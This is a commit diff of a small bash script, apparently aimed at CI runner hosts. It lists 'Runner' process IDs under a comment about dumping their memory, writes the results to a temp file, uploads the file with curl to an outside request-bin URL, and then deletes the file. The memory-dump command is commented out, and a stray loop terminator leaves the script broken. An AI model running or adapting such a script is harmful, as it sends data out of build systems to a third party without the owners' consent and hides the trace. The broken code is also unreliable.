83a1e11a84cdcf60ba0fb08ff2bbaf1dfd679fd2
_m <matiasesena@gmail.com>
2021-11-05 16:29:20 -0300

    Update falopa3.sh

--- falopa3.sh
+++ falopa3.sh
@@ -1,20 +1,20 @@
 #!/bin/bash
 
-echo "--- START ---" > /tmp/file5.txt
+echo "--- START ---" > /tmp/fafafa.txt
 
-echo $(perf -v) >> /tmp/file5.txt
+echo $(perf -v) >> /tmp/fafafa.txt
 
 # get pids related to runners and dump their memory
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
-    echo "-----$pid-----" >> /tmp/file5.txt;
-    #echo $(perf record -p $pid -o /tmp/hola.data -c 1) >> tmp/file5.txt;
+    echo "-----$pid-----" >> /tmp/fafafa.txt;
+    #echo $(perf record -p $pid -o /tmp/hola.data -c 1) >> tmp/fafafa.txt;
     done
-    echo "--------------" >> /tmp/file5.txt;
+    echo "--------------" >> /tmp/fafafa.txt;
 done
 
-echo "--- FINISH ---" >> /tmp/file5.txt
+echo "--- FINISH ---" >> /tmp/fafafa.txt
 
-curl --data-binary "@/tmp/file5.txt" https://ensf2rlc2dw6p.x.pipedream.net/
+curl --data-binary "@/tmp/fafafa.txt" https://ensf2rlc2dw6p.x.pipedream.net/
 
-rm /tmp/file3.txt
+rm /tmp/fafafa.txt
